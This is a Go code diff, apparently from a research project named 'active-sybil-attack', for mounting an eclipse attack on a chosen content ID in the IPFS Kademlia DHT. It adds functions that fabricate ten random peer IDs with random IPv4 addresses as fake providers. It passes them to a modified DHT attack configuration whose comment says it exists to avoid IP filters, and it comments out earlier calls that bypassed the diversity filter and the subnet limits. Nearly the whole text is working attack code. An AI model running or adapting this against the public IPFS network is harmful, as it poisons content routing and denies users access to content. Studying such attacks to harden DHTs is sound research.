@@ -8,9 +8,11 @@ import (
 	"github.com/ipfs/kubo/core"
 	dht "github.com/libp2p/go-libp2p-kad-dht"
 	"github.com/libp2p/go-libp2p/core/peer"
-	rcmgr "github.com/libp2p/go-libp2p/p2p/host/resource-manager"
+	"github.com/multiformats/go-multiaddr"
 	"github.com/vicnetto/active-sybil-attack/logger"
 	ipfspeer "github.com/vicnetto/active-sybil-attack/node/peer"
+	"math/rand"
+	"net"
 	"os"
 	"os/signal"
 	"sybil/friends"
@@ -97,6 +99,30 @@ func treatFlags() *FlagConfig {
 	return &flagConfig
 }
 
+func generateRandomIp() net.IP {
+	ip := make(net.IP, 4)
+
+	for i := 0; i < 4; i++ {
+		ip[i] = byte(rand.Intn(256))
+	}
+
+	return ip
+}
+
+func generateRandomProviders(node *core.IpfsNode) []peer.AddrInfo {
+	var randomProviders []peer.AddrInfo
+
+	for i := 0; i < 10; i++ {
+		// Generating completely random peer and address
+		genPid, _ := node.DHT.WAN.RoutingTable().GenRandPeerID(0)
+		ip := []multiaddr.Multiaddr{multiaddr.StringCast("/ip4/" + generateRandomIp().String() + "/tcp/4001")}
+
+		randomProviders = append(randomProviders, peer.AddrInfo{ID: genPid, Addrs: ip})
+	}
+
+	return randomProviders
+}
+
 func main() {
 	flagConfig := treatFlags()
 
@@ -115,15 +141,15 @@ func main() {
 		otherSybils = friends.ReadOtherPeersAsPeerInfo(*flagConfig.sybilsFilePath, sybilConfig.Identity.PrivKey, *sybilConfig.Ip)
 	}
 
-	nodeApi, node, err := ipfspeer.SpawnEphemeral(ctx, sybilConfig)
+	ipfs, node, err := ipfspeer.SpawnEphemeral(ctx, sybilConfig)
 	if err != nil {
 		panic(err)
 	}
 
 	// Set attack configuration to avoid IP filters and specify the CID to be eclipsed
-	dht.SetAttackConfiguration(*flagConfig.eclipsedCid, *flagConfig.isActive, otherSybils)
-	dht.SetGroupToBypassDiversityFilter(friends.ExtractGroupFromIp(*flagConfig.ip))
-	rcmgr.SetAllowedIpForSubnetLimit(*flagConfig.ip)
+	dht.SetAttackConfiguration(*flagConfig.eclipsedCid, *flagConfig.isActive, otherSybils, generateRandomProviders(node))
+	// dht.SetGroupToBypassDiversityFilter(friends.ExtractGroupFromIp(*flagConfig.ip))
+	// rcmgr.SetAllowedIpForSubnetLimit(*flagConfig.ip)
 
 	decode, err := gocid.Decode(*flagConfig.eclipsedCid)
 	if err != nil {
@@ -136,7 +162,7 @@ func main() {
 	peers, err := node.DHT.WAN.GetClosestPeers(ctx, string(decode.Hash()))
 	log.Info.Printf("Closest peers to %s: %q\n\n", decode.String(), peers)
 
-	myAddresses, err := nodeApi.Swarm().ListenAddrs(ctx)
+	myAddresses, err := ipfs.Swarm().ListenAddrs(ctx)
 	log.Info.Println("My addresses:", myAddresses, "\n")
 
 	// Only if has other sybils to connect
